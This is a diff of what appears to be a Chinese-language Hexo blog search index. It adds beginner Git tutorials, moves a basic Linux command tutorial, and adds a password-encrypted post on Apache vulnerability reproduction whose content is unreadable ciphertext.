+<li>当你不但改乱了工作区某个文件的内容，还添加到了暂存区时，想丢弃修改，分两步，第一步用命令<code>git reset HEAD &lt;file&gt;</code>，就回到了①，第二步按①操作。</li>
+<li>已经提交了不合适的修改到版本库时，想要撤销本次提交，参考版本回退一节，不过前提是没有推送到远程库。</li>
+</ul>
+</li>
+<li><p>已经提交了不合适的修改到版本库时，想要撤销本次提交，参考版本回退一节，不过前提是没有推送到远程库。</p>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>Git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Git学习（一）</title>
+    <url>/posts/55269.html</url>
+    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Git是目前世界上最先进的分布式版本控制系统（没有之一）。</p>
+<p>以前写的代码、文档之类的东西用完之后就被我无情抛弃了，以后要用的时候又需要重新写，麻烦，所以就想到了使用Git，将自己的文档、代码托管到GitHub上。</p>
+<h2 id="0x01-安装Git"><a href="#0x01-安装Git" class="headerlink" title="0x01 安装Git"></a>0x01 安装Git</h2><p>在Windows上使用Git，直接从官网上下载<a href="https://git-scm.com/downloads" target="_blank" rel="noopener" title="安装程序">安装程序</a>，然后默认选项安装即可。</p>
+<p>安装完成后，鼠标右键，出现如下图，说明Git安装成功！<br><img src="/posts/55269/1.png" alt></p>
+<p>安装完成后，还需要最后一步设置，鼠标右键“Git bash here”，在命令行输入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name &quot;Your Name&quot;</span><br><span class="line">$ git config --global user.email &quot;Your Email&quot;</span><br></pre></td></tr></table></figure>
+<p><strong>注意:</strong> git config命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p>
+<h2 id="0x02-创建版本库"><a href="#0x02-创建版本库" class="headerlink" title="0x02 创建版本库"></a>0x02 创建版本库</h2><p>什么是版本库呢？版本库又名仓库，英文名repository，可以理解成一个目录，这个目录里面的所有文件都可以被Git管理起来，每个文件的创建、修改、删除，Git都能跟踪，以便任何时刻都可以追踪历史，或者在将来某个时刻可以“还原”。</p>
+<p>创建一个版本库也很简单，选择一个合适的地方，创建一个空目录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir learnGit</span><br><span class="line">$ cd learnGit</span><br></pre></td></tr></table></figure>
+<p>通过<code>git init</code>命令把这个目录变成Git可以管理的仓库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git init</span><br><span class="line">Initialized empty Git repository in F:&#x2F;PythonProject&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
+<p>这样仓库就建好了，但是里面是空的，其实当前目录下多了一个<code>.git</code>文件夹，这个目录是Git用来跟踪管理版本库的，千万不要乱动。</p>
+<p>如果没有看到.git文件夹，可能是你把它隐藏了，可以用<code>ls -la</code>查看</p>
+<h2 id="0x03-三个工作区"><a href="#0x03-三个工作区" class="headerlink" title="0x03 三个工作区"></a>0x03 三个工作区</h2><ul>
+<li>工作区： 指本地创建的目录，主要保存本地文件</li>
+<li>暂存区： <code>git add</code>之后文件进入的地方，此时文件还没有进入版本库</li>
+<li>版本库： 即仓库，<code>git commit</code>之后，文件从暂存区进入仓库</li>
+</ul>
+<h2 id="0x04-小试牛刀"><a href="#0x04-小试牛刀" class="headerlink" title="0x04 小试牛刀"></a>0x04 小试牛刀</h2><p>我们先编写一个<code>README.txt</code>文件，内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Git is a version control system.</span><br><span class="line">This is my first test for Git!</span><br></pre></td></tr></table></figure>
+<p>一定要放到learngit目录下（子目录也行），因为这是一个Git仓库，放到其他地方Git找不到这个文件。</p>
+<p>第一步，用<code>git add &lt;file&gt;</code>把文件添加到仓库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add README.txt</span><br></pre></td></tr></table></figure>
+<p>执行完后没有任何回显，这就对了，Unix的哲学是“没有消息就是好消息”，说明添加成功。</p>
+<p>第二步，用<code>git commit</code>提交文件到仓库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;add a new README.txt file&quot;</span><br><span class="line">[master (root-commit) 6881823] add a new README.txt file</span><br><span class="line"> 1 file changed, 2 insertions(+)</span><br><span class="line"> create mode 100644 README.txt</span><br></pre></td></tr></table></figure>
+<p><code>-m</code>后面是本次提交的说明，可以输入任何内容，也可以不输。</p>
+<p><strong>说明：</strong> <code>git add</code>一次添加一个文件，<code>git commit</code>可以把多次add的文件一次性提交。</p>
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>今天主要学习如下：</p>
+<p>初始化一个Git仓库，使用<code>git init</code>命令。</p>
+<p>添加文件到Git仓库，分两步：</p>
+<ol>
+<li>使用命令git add <file>，注意，可反复多次使用，添加多个文件；</file></li>
+<li>使用命令git commit -m <message>，完成。</message></li>
+</ol>
+<p>这里要特别强调一下，所有的版本控制系统，其实只能跟踪文本文件的改动，比如TXT文件，网页，所有的程序代码等等，Git也不例外。版本控制系统可以告诉你每次的改动，比如在第5行加了一个单词“Linux”，在第8行删了一个单词“Windows”。而图片、视频这些二进制文件，虽然也能由版本控制系统管理，但没法跟踪文件的变化，只能把二进制文件每次改动串起来，也就是只知道图片从100KB改成了120KB，但到底改了啥，版本控制系统不知道，也没法知道。</p>
+<p>不幸的是，Microsoft的Word格式是二进制格式，因此，版本控制系统是没法跟踪Word文件的改动的，前面我们举的例子只是为了演示，如果要真正使用版本控制系统，就要以纯文本方式编写文件。</p>
+<p>因为文本是有编码的，比如中文有常用的GBK编码，日文有Shift_JIS编码，如果没有历史遗留问题，强烈建议使用标准的UTF-8编码，所有语言使用同一种编码，既没有冲突，又被所有平台所支持。</p>
+]]></content>
+      <tags>
+        <tag>Git</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTTP消息头</title>
     <url>/posts/35270.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>HTTP消息头是指，在超文本传输协议（ Hypertext Transfer Protocol ，HTTP）的请求和响应消息中，协议头部分的那些组件。HTTP消息头用来准确描述正在获取的资源、服务器或者客户端的行为，定义了HTTP事务中的具体操作参数。</p>
@@ -912,40 +912,6 @@
       <tags>
         <tag>web</tag>
         <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux入门学习</title>
-    <url>/posts/18536.html</url>
-    <content><![CDATA[<h2 id="指令与选项"><a href="#指令与选项" class="headerlink" title="指令与选项"></a>指令与选项</h2><p>什么是Linux的指令？<br>指在Linux终端（命令行）中输入的内容就称之为指令 </p>
-<a id="more"></a> 
-<p><img src="https://i.imgur.com/fM5coUs.png" alt><br>一个完整的指令的标准格式：Linux通用的格式</p>
-<p><strong>指令主体（空格） [选项]（空格） [操作对象]</strong></p>
-<p>一个指令可以包含多个选项操作对象也可以是多个。</p>
-<p>例如：需要让张三同学帮忙去楼下小卖铺买一瓶农夫山泉水和清风餐巾纸，在这个指令中“买东西”是指令的主体，买的水和餐巾纸是操作的对象，农夫山泉、清风是操作的选项。</p>
-<h2 id="基础指令（重点）"><a href="#基础指令（重点）" class="headerlink" title="基础指令（重点）"></a>基础指令（重点）</h2><p><strong>1、ls指令</strong><br>含义：ls （list）<br><strong>用法1</strong>：<br><code>#ls</code><br>含义：列出当前工作目录下的所有文件/文件夹的名称<br><img src="https://i.imgur.com/MNMiZm6.png" alt><br><strong>用法2</strong>：<br><code>#ls 路径</code><br>含义：列出指定路径下的所有文件/文件夹的名称<br><strong>关于路径</strong>（重要）：<br>路径可以分为两种：相对路径、绝对路径。<br>相对路径：相对首先得有一个参照物（一般就是当前的工作路径）；<br>相对路径的写法：在相对路径中通常会用到2个符号“./”【表示当前目录下】、“../”【上一级目录下】。<br>绝对路径：绝对路径不需要参照物，直接从根“/”开始寻找对应路径；<br><img src="https://i.imgur.com/cVXsgTA.png" alt><br>用法3：#ls 选项 路径<br>含义：在列出指定路径下的文件/文件夹的名称，并以指定的格式进行显示。<br>常见的语法：<br>    #ls -l 路径<br>    #ls -la 路径<br>选项解释：<br>    -l：表示list，表示以详细列表的形式进行展示<br>    -a：表示显示所有的文件/文件夹（包含了隐藏文件/文件夹）<br><img src="https://i.imgur.com/nFBEltY.png" alt><br>上述列表中的第一列字符表示文档的类型，其中“-”表示改行对应的文档类型为文件，“d”表示文档类型为文件夹。<br><img src="https://i.imgur.com/IZH0Y2T.png" alt><br>在Linux中隐藏文档一般都是以“.”开头。<br><strong>用法4</strong>：#ls -lh 路径<br>含义：列出指定路径下的所有文件/文件夹的名称，以列表的形式并且在显示文档大小的时候以可读性较高的形式显示<br>参数含义：<br><img src="https://i.imgur.com/U0HadBJ.png" alt><br><strong>2、pwd指令</strong><br>用法：#pwd （print working directory，打印当前工作目录）<br><img src="https://i.imgur.com/WJD7plQ.png" alt><br><strong>3、cd指令</strong><br>命令：#cd        （change directory，改变目录）<br>作用：用于切换当前的工作目录的<br>语法：#cd 路径</p>
-<p>案例：当前在“/”下，需要使用绝对路径切换到/usr/local。<br><img src="https://i.imgur.com/d9G4f1z.png" alt></p>
-<p>案例：当前在/usr/local下，需要使用相对路径切换目录到home目录下的Linux123用户家目录中去。<br><img src="https://i.imgur.com/9037q6Y.png" alt><br>补充：<br>在Linux中有一个特殊的符号“~”，表示当前用户的家目录。<br>切换的方式：#cd ~<br><img src="https://i.imgur.com/hUPzXml.png" alt><br><strong>4、mkdir指令</strong><br>指令：mkdir    （make directory，创建目录）<br>语法1：#mkdir 路径 【路径，可以是文件夹名称也可以是包含名称的一个完整路径】</p>
-<p>案例：在当前路径下创建出目录“yunweihenniux”<br><img src="https://i.imgur.com/0SemL16.png" alt><br>注意：ls列出的结果颜色说明，其中蓝色的名称表示文件夹，黑色的表示文件，绿色的其权限为拥有所有权限。 </p>
-<p>案例：在指定路径下创建出一个文件夹“yunweihenniux”<br><img src="https://i.imgur.com/tdL2awL.png" alt>   </p>
-<p>语法2：#mkdir -p 路径<br>含义：当一次性创建多层不存在的目录的时候，添加-p参数，否则会报错<br><img src="https://i.imgur.com/fzvNnfY.png" alt> </p>
-<p>语法3：#mkdir 路径1 路径2 路径3 ….  【表示一次性创建多个目录】<br><img src="https://i.imgur.com/12MjF4A.png" alt>   </p>
-<p><strong>5、touch指令</strong><br>令：touch<br>作用：创建文件<br>语法：#touch 文件路径    【路径可以是直接的文件名也可以是路径】 </p>
-<p>案例：使用touch来在当前路径下创建一个文件，命名为Linux.txt<br><img src="https://i.imgur.com/2cVdBLZ.png" alt><br>案例：使用touch来同时创建多个文件<br> <img src="https://i.imgur.com/udw4JAh.png" alt><br>案例：使用touch来在“Linux123”用户的家目录中创建文件，Linux.txt<br><img src="https://i.imgur.com/EA9vj21.png" alt>   </p>
-<p><strong>6、cp指令</strong><br>指令：cp        （copy，复制）<br>作用：复制文件/文件夹到指定的位置<br>语法：#cp 被复制的文档路径 文档被复制到的路径</p>
-<p>案例：使用cp命令来复制一个文件<br><img src="https://i.imgur.com/v0Lvl89.png" alt><br>注意：Linux在复制过程中是可以重新对新位置的文件进行重命名的，但是如果不是必须的需要，则建议保持前后名称一致。</p>
-<p>案例：使用cp命令来复制一个文件夹<br>注意：当使用cp命令进行文件夹复制操作的时候需要添加选项“-r”【-r表示递归复制】，否则目录将被忽略<br><img src="https://i.imgur.com/dA2SgW8.png" alt>   </p>
-<p><strong>7、mv指令</strong><br>指令：mv   （move，移动，剪切）<br>作用：移动文档到新的位置<br>语法：#mv 需要移动的文档路径 需要保存的位置路径</p>
-<p>确认：移动之后原始的文件还在不在原来的位置？原始文件是不在原始位置的</p>
-<p>案例：使用mv命令移动一个文件<br><img src="https://i.imgur.com/IXuhMPg.png" alt><br>案例：使用mv命令移动一个文件夹<br><img src="https://i.imgur.com/klYJwNI.png" alt><br>补充：在Linux中重命名的命令也是mv，语法和移动语法一样。<br><img src="https://i.imgur.com/1Uwg8yZ.png" alt>   </p>
-<p><strong>8、rm指令</strong><br>指令：rm （remove，移除、删除）<br>作用：移除/删除文档<br>语法：#rm 选项 需要移除的文档路径<br>选项：<br>    -f：force，强制删除，不提示是否删除<br>    -r：表示递归</p>
-<p>案例：删除一个文件<br><img src="https://i.imgur.com/gyOCm41.png" alt>   </p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>linux</tag>
       </tags>
   </entry>
   <entry>
@@ -1008,6 +974,40 @@
       </categories>
       <tags>
         <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux入门学习</title>
+    <url>/posts/18536.html</url>
+    <content><![CDATA[<h2 id="指令与选项"><a href="#指令与选项" class="headerlink" title="指令与选项"></a>指令与选项</h2><p>什么是Linux的指令？<br>指在Linux终端（命令行）中输入的内容就称之为指令 </p>
+<a id="more"></a> 
+<p><img src="https://i.imgur.com/fM5coUs.png" alt><br>一个完整的指令的标准格式：Linux通用的格式</p>
+<p><strong>指令主体（空格） [选项]（空格） [操作对象]</strong></p>
+<p>一个指令可以包含多个选项操作对象也可以是多个。</p>
+<p>例如：需要让张三同学帮忙去楼下小卖铺买一瓶农夫山泉水和清风餐巾纸，在这个指令中“买东西”是指令的主体，买的水和餐巾纸是操作的对象，农夫山泉、清风是操作的选项。</p>
+<h2 id="基础指令（重点）"><a href="#基础指令（重点）" class="headerlink" title="基础指令（重点）"></a>基础指令（重点）</h2><p><strong>1、ls指令</strong><br>含义：ls （list）<br><strong>用法1</strong>：<br><code>#ls</code><br>含义：列出当前工作目录下的所有文件/文件夹的名称<br><img src="https://i.imgur.com/MNMiZm6.png" alt><br><strong>用法2</strong>：<br><code>#ls 路径</code><br>含义：列出指定路径下的所有文件/文件夹的名称<br><strong>关于路径</strong>（重要）：<br>路径可以分为两种：相对路径、绝对路径。<br>相对路径：相对首先得有一个参照物（一般就是当前的工作路径）；<br>相对路径的写法：在相对路径中通常会用到2个符号“./”【表示当前目录下】、“../”【上一级目录下】。<br>绝对路径：绝对路径不需要参照物，直接从根“/”开始寻找对应路径；<br><img src="https://i.imgur.com/cVXsgTA.png" alt><br>用法3：#ls 选项 路径<br>含义：在列出指定路径下的文件/文件夹的名称，并以指定的格式进行显示。<br>常见的语法：<br>    #ls -l 路径<br>    #ls -la 路径<br>选项解释：<br>    -l：表示list，表示以详细列表的形式进行展示<br>    -a：表示显示所有的文件/文件夹（包含了隐藏文件/文件夹）<br><img src="https://i.imgur.com/nFBEltY.png" alt><br>上述列表中的第一列字符表示文档的类型，其中“-”表示改行对应的文档类型为文件，“d”表示文档类型为文件夹。<br><img src="https://i.imgur.com/IZH0Y2T.png" alt><br>在Linux中隐藏文档一般都是以“.”开头。<br><strong>用法4</strong>：#ls -lh 路径<br>含义：列出指定路径下的所有文件/文件夹的名称，以列表的形式并且在显示文档大小的时候以可读性较高的形式显示<br>参数含义：<br><img src="https://i.imgur.com/U0HadBJ.png" alt><br><strong>2、pwd指令</strong><br>用法：#pwd （print working directory，打印当前工作目录）<br><img src="https://i.imgur.com/WJD7plQ.png" alt><br><strong>3、cd指令</strong><br>命令：#cd        （change directory，改变目录）<br>作用：用于切换当前的工作目录的<br>语法：#cd 路径</p>
+<p>案例：当前在“/”下，需要使用绝对路径切换到/usr/local。<br><img src="https://i.imgur.com/d9G4f1z.png" alt></p>
+<p>案例：当前在/usr/local下，需要使用相对路径切换目录到home目录下的Linux123用户家目录中去。<br><img src="https://i.imgur.com/9037q6Y.png" alt><br>补充：<br>在Linux中有一个特殊的符号“~”，表示当前用户的家目录。<br>切换的方式：#cd ~<br><img src="https://i.imgur.com/hUPzXml.png" alt><br><strong>4、mkdir指令</strong><br>指令：mkdir    （make directory，创建目录）<br>语法1：#mkdir 路径 【路径，可以是文件夹名称也可以是包含名称的一个完整路径】</p>
+<p>案例：在当前路径下创建出目录“yunweihenniux”<br><img src="https://i.imgur.com/0SemL16.png" alt><br>注意：ls列出的结果颜色说明，其中蓝色的名称表示文件夹，黑色的表示文件，绿色的其权限为拥有所有权限。 </p>
+<p>案例：在指定路径下创建出一个文件夹“yunweihenniux”<br><img src="https://i.imgur.com/tdL2awL.png" alt>   </p>
+<p>语法2：#mkdir -p 路径<br>含义：当一次性创建多层不存在的目录的时候，添加-p参数，否则会报错<br><img src="https://i.imgur.com/fzvNnfY.png" alt> </p>
+<p>语法3：#mkdir 路径1 路径2 路径3 ….  【表示一次性创建多个目录】<br><img src="https://i.imgur.com/12MjF4A.png" alt>   </p>
+<p><strong>5、touch指令</strong><br>令：touch<br>作用：创建文件<br>语法：#touch 文件路径    【路径可以是直接的文件名也可以是路径】 </p>
+<p>案例：使用touch来在当前路径下创建一个文件，命名为Linux.txt<br><img src="https://i.imgur.com/2cVdBLZ.png" alt><br>案例：使用touch来同时创建多个文件<br> <img src="https://i.imgur.com/udw4JAh.png" alt><br>案例：使用touch来在“Linux123”用户的家目录中创建文件，Linux.txt<br><img src="https://i.imgur.com/EA9vj21.png" alt>   </p>
+<p><strong>6、cp指令</strong><br>指令：cp        （copy，复制）<br>作用：复制文件/文件夹到指定的位置<br>语法：#cp 被复制的文档路径 文档被复制到的路径</p>
+<p>案例：使用cp命令来复制一个文件<br><img src="https://i.imgur.com/v0Lvl89.png" alt><br>注意：Linux在复制过程中是可以重新对新位置的文件进行重命名的，但是如果不是必须的需要，则建议保持前后名称一致。</p>
+<p>案例：使用cp命令来复制一个文件夹<br>注意：当使用cp命令进行文件夹复制操作的时候需要添加选项“-r”【-r表示递归复制】，否则目录将被忽略<br><img src="https://i.imgur.com/dA2SgW8.png" alt>   </p>
+<p><strong>7、mv指令</strong><br>指令：mv   （move，移动，剪切）<br>作用：移动文档到新的位置<br>语法：#mv 需要移动的文档路径 需要保存的位置路径</p>
+<p>确认：移动之后原始的文件还在不在原来的位置？原始文件是不在原始位置的</p>
+<p>案例：使用mv命令移动一个文件<br><img src="https://i.imgur.com/IXuhMPg.png" alt><br>案例：使用mv命令移动一个文件夹<br><img src="https://i.imgur.com/klYJwNI.png" alt><br>补充：在Linux中重命名的命令也是mv，语法和移动语法一样。<br><img src="https://i.imgur.com/1Uwg8yZ.png" alt>   </p>
+<p><strong>8、rm指令</strong><br>指令：rm （remove，移除、删除）<br>作用：移除/删除文档<br>语法：#rm 选项 需要移除的文档路径<br>选项：<br>    -f：force，强制删除，不提示是否删除<br>    -r：表示递归</p>
+<p>案例：删除一个文件<br><img src="https://i.imgur.com/gyOCm41.png" alt>   </p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
       </tags>
   </entry>
   <entry>
@@ -1356,6 +1356,25 @@
       </tags>
   </entry>
   <entry>
+    <title>apache漏洞复现</title>
+    <url>/posts/37023.html</url>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">输入密码，查看文章</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="46bec07618b737fb072919e099a207d023e74c67143d88748bfad21bb7f613b2">a5bbd5a243d550a42b2225377979c51cc20184fa86ed12dad3fc3c852571ea177c5964bee3a871018b2cfb91bb14063df3ad7425cb77645281cdca59c0291147477c844ad868c5dc907aedd19ce1ec3d4ec50705f600cc257894517cba8ff7e48f9111c926c56eb00a3cfb1f8ba5dcbfb6cc75d92a3fdf1058172a6008baae40fbe267f4d7955f4fd3e01d6731c063bdeac39aba9e10535eb58aa98018bb7b1841b99bf6905436f6e5542317aadb34fa2dcd87147565875fecaa2bc255e294b19a22040e5a8752addb565cfffb036b1b27733655e9a50a4e19c0c95d51f063a785e19b4916e87525a99f037e4a023e3e3a50377c84975339c58b22c441496bdf24c2928634f2ff77f5931c98fe54435fbde54768542a172fbdc9c5c49411618c4ad815ed4628083776da8ab1cdea10d6821609cdc2965e5c5c3d21d51ae4eb2cd38cd9b6a566baebfc792ad22443d36bb50b7a0b9acfb9456893b912db17e2059a60db3a1e1a905b65f216ceaf9c59875dfd7dbd823a92c093d31d679b5c465af625f3a3de013831cd61f5d73a2b80cb1419c4e0536ef05f9f07859deeeda11f6060ba9b634bca88683d8376255b263fb307433b0bdaaf2f26cd4186d31fbecabd168a8f4c4001429901f912fe72e93bd78c95a8fee64efd54fdbefb3566081cabfc15c0299ad2bacfb85e401e556bb395a72706db429cc734aff7c9ccb9f29892b7c22456390182537dfe1503672347899cc763a7c2b58108a27fb351298786097030aa44452f67e67681d93cc36b817fabdaa8b210b973b733fa7e38faf752197ae8d5f7f58145257259b7e8e169f9a46ea4794caf839b8df01902b2bc407f54bc2f8d92c74b1c7f8ee2d8b8e2cdc0261a5b20835ff11cda5fb643b642a1c9646c7170bf59a654bfee842e3e20261bb8079f27c4265ff84aec1e4b72c390b9042ade6d13c189e73fe2bd7a23d0fe76aa30680d91585662a472b971fe15aadc7ce599d14b9bc232b6247b3deb2b58a448fde20ec0e949959dcb13bc67e5cc419aaa03df14d388b164aeebbd1804fc8a7c4488d51fa84042c5f8d29a550b9cd87ed8a5d8cfc642761059e7d007e6a104b4546a347d56defe4f770cd4e4f62001840b6b33d62a023ca195ec8c6603c5eab6c518be07f8f6249824eea6e29eca09487566b221d059676da7587536ad54e9a1f143a4fc85963de59ff5e8f2b75d343caa156d7484a63ebbd841bd14cd3974748a709dbd02172ca1c4acaf4d85839d671c2e7dec8dbf79e3674b3cd9680b83d61347916b24307829570c12c0e87757a24ed69d58d61f0f647b98536a9b2ddc0ef9d4c7018e35ff2dd991fb968a085eaf405e49e74e8cf86e5de706e9d1afa400e32b6786c4b5bca736291056fa0b18baffaf0408df683f780a76ac73ffb8e27dff36a3258e273cf9ee1b840eade8cde2e0a9adb00e6c962a7d33af4abe9b38eb8c8757ad9912600b3f653ac3cafb9db0bfa3e8240a363d8e5c1e2532edec8d0697646b41fd031f07b6833a091e8475e8fdcbed9a5c01174dcc357e2d32b465f3622a5dcc89500a3e9a0a4fd6d997a62f594ffe686cab2dd1315ef5516c0b063cfdc29ba7f40456202050dcdc63c2767e953d03d86cfa4f86d191873350b8f03d71ad20df18f2fbb3143a56ca571f09f923690e84f845988098eab401d42a8ef601c3075ff02b690ae1e5450e0c0886d23ba80cbeb1a2a86b70355b2443d6f1918e80af1bdb63f8c377ef5e3a75bd58c88803665781a0036423cab1a4217c87194c0838bd5e27ca30fafa549623690abb6aa4ace66454f2f646f9c2180e28fce475addfe9e0e3cbe86494b7b80c3cc338af2b476e761f07748f199c1b5ef052883a6d98769db9f495bd4c27c234d959b67229e624e0d2587dc996e0e6dc1553bc136a1234b7ace2c28de9f730c90a47afcc21a8c833a289e4477576e4e1f56d989d4b5982ee2fbcdb1a67747f8d27552c5acd560ad3a2860635fcbb617795a667d10db8fee49babe683147e5d90194a863f1418855d12b4574f773dd415829bc755d1e873723b00cb1342a500e7744553a478798106e3e2cf1564a1cced2b92e4723a8a16e47efc8d09dd13c36f37ceff7987658d0bc10c4d976baef8c3d06556b7ffb1ed0d6f353fe1e79640161db29703f514af5c7012e53cc92dfdae1a8aa5cb8319a2b2d7102f158feca1fc389a64617b9280cb14a528b642666471246326378027877509c3289ef822b8e1bee35d7b9cfedc663c4dca553d57a3f3f7fa0a301f9fe7a028628217445a9bee6aa57dda0d333bc62fcdf6f5159fdb8a829bad2c7e8683f8bf24d551697783db8cccdf1cea334c3040649d6c713afd64ba0f3772f75aa7c84be45a88c6695d37c9dfbda9a2b31a92757c402c90701b62ef6b7e34d7702beac9399de30835423448c9288c9bdcea74cbcadd659bc43665143658d2d99e3898da8528be7d914c6015fbfb879aae8b5146a8b07c3cb11d330f94ba90eedbaf43ec1291c831caaf114590f0657e2a26f896493c41f76b851ac18f949db7ff2cc6826bd1a2446648c212eea59e549578c5dc6ada536a223ad9098b033ffbe81f0de39eeade609a0ad71c5c7c8512004c77e31951dfe6cb6e5607198c8aed54484eac45a1dbbb335effae31eca82220950ab60681e5ee47c0c2a338d50aa30604bc4fdc1f8addc11e6c983ff5799a04e84a20e04222ea8379a3a2b36c87fd908a0c25ab45588c4d3ade54453549b9e079910fafc9c73e9ef335b3712f3ae11d5527a4081eca80843928282fb07f1062a0f19cf8baf662164497d9c8782efb0edd3623ea3ac75f7967d207764f4b5b13d13f098d530b941af5413067b720ff1342c5881dd1849f411ba99b2e8bde0841db8de92a600b55e8b58994b5a8ee67840f3c1521b6553d825d267d2c7df81cb51ff655a9c40f19507db0ca4197da8c54e41c07c4eafad35dbae29a2e1e120ee6b67c5b99686a631d7f673650e2357c5e99946eec5fc51e0b174b31c79f06549683e948afd119bdb0bc5b7b56314193ca3d9e01d3eb79a4c68ac6f3e9b45c1ee8542514e72e4f80b814e8e517a4bf5f071225177d686c409b2758de5cb77209420db062664a5ffef30d009ef47db88eb0e934a232eb15ba413f43099ef36a7c5088c1a42533784190354f2c5f79cc64d7fe92457580a80a27ac1069b30b60dca4cb3d97621cf42b27d83279a7a61cea7c3d5b3964f6c859fe55017b6b5141369f7c7de03f7491cdadd67777ceb3e854469cfa69e54598ffe2fdbc9e3ae003a01fa238e417b2d5a92fda273d07a514f58ed67a4ecff4c056b6640cb3258d08676b73c0fd5f6de88b981c75ef9cacc42b491e1a93020fa5b6969c528635fdd86d40ff5925b23e5355aa9850cecdc7d3883568c85ba4615bdec7315ebb5716257304b5760f874a018e465b15f102c3636921348fd37ffcb1922170e7b7419a99d77f62a9afbb1696b350fc7653fbc4b2e980b3d4356f303953c661f1a453af19b72efe96116f243e78ca1a74c9630082af7386c7f4d4ce5da8962a9abc8ab66a4b073df6ddda3b5b4b29ea27452b9e74c39a70ea7cc92e48d8af8cac25475829a7540880587d5fd554084824486908ecf4035b5e047ebe48169e8c415f05482b0206a56adfafd9e650add865d2b910664eef7dffe9c283a47786c598a0dbf6828be3d1962b945938eb603991e0fb72592418ebcb310d0911b0ab7adb2d5a5c6d0bdcc987e3354ef43d8bf578bc941161bff7391841b79171b90f3a212cd1a6163f72edbeef8e336cd1dbdb3dab77d1626ccbcf27f578994ed6cd2e0991617137479470d573371566d9724b19f6b5f2c833c739864343ba4de0e06b1d63839a97e086726c78d9bfcbb40f25f92e695d755fe129d71099f33841d712692b8d3d36d0338f803bd183f582bf33497b62273c4d70bc629985edf1d042d70af38a95cf6c4629fa69e3279c54f4eac4e2433692bd488cba3ea07dd6b10569c16e98c696cdc8665a1c4d28a9c046e5b3c5d4a9cbb60d97735b69e59265121a50c1228f467cd541eba3568c61d14d1322d8627f970192899b9f051c3a791fa934adb80a18f194de1797bc6a874933180736d0a2fd9c0447aa51ab56ee17fa339b2c14ff575972f7e9e085d0e452f85334414e0b45c0532897eb6e3a7b3f8227aaeaef89d75a5feff96ddfb471e17cfe8c5dd12c38b1cad6ef41dd6766d6aa58d62e7cf705d18d3b1c62f4c08dc81c51e5cccb6ec2b9fc08bf139c1bd7d07030aaad8a37a97db348bcb7b79421fae4991d556887fc54143c400e10b46b522b4ecfff57538e309ac83e58975b682e8e9635e5f6a1a6e703a4db26b56044240bab67a69d28f2e514ee067895713e801ae6f190bb32cc6abf142d677970187a91bf61a6c01b51c964e2a85977a6caf6da38e1c78484beb96f10230cc3ff4ebf71086033ced646ecd60199c7fe55dee824fc9da5133e5bef996fe8ab0f6be58d9b35f435cf67d2ac5a1f2d8c3b831116c7d5d5652cc87fac5ce2f4a508f0a0553256a941a84d5e8af82fb91fc0e29dd197e6a2a1a20eb51092db68753c8e1348846b759b9e37ed56e73362a58d5cf4e647eeb86ed82ed05d90965fe6e009b6c5f861a580419b60ddc32401a87dca659762b6c0653dd1cc9fc953efd43913aadd3ef8982242589c9af2b52fe64d0354ad6007abba369948f5bf68f41378cbcc6fe5de6f7c51af673c24d1e06b630c744cc96b08a9d9f1f3f9de971b8cf3332ad9904a09876a2413f0ea5e64fda14acce6bec7c01e36175ed47d5c45712382c313489da333fa2ce08031477b4bec223c21da409581a0451d4b95d91fa2c64123dd17ea0050a50dc1606ffffe17405adc21502f65a00ec1dc3155403caf80da9728b1d0eb74ca72e04eb051855cbe18defbe86cf774e1d20524b96d2fb2b2453042ef746ea6d303e218b29415036dfaeb3aa4e02098ee3e0d78e457ff6515d4721c3464d081b399aff57188c5392d58fbdc9c0e5b82cf48c78353bc497feef3d6041953ac13dadc9e8e2acb59599f73c37be2d434deac1c4daa63a1a65b22bb2f75aa242cfd8cbdd6a7ae66a452b48bb1c963da380dee7f0b2f797de66ffb1fc766d9cacb485f3afeefee71a850df61586dbb898534ac64da2e811794fd0dcec227b163fd6d96447d3a49fbaa389507796df8987f08d6a0f5762cca314991fb311987979519ee038cec266ef7dded7116e3f2cb93d43c73b58a9de0dcf7b8c962b10d9341b127986f925af5140b3b88e169b376af607fc214dd19086c5f352dbbe2d8af2caa01c52f7c2e1c17d047f63cb4c280717483596b2af3d178b705eac181686cb8fa8faf026fbb5c578cf826a1d20409cbf20b6c4f405f58b401a55be9b10300dd6b17440f48b8b17b738510979f040bd6dd42c38e9186963ae147fc2d42dea02e8c0e5ae7998f32a11f3485116a4adbff00d7bac08915caa56945878c7175ce722ba7f916e02c923ef24f12cfbf521752ef6495a3d292f6bd506f6d7c496dc647553bcd86417fcfb7c50300fc9e669a64073a2d9f66acf2eaa6f5a181486298ded5991b85b40cf7158914d4d8d51fb2230961d9e09d3095f14f030329b7a6707fa9200a6134f84e7f809d0d3e21086d0db603da622156f90cf6c71f3cbd6f91fe612baaca852ffc6e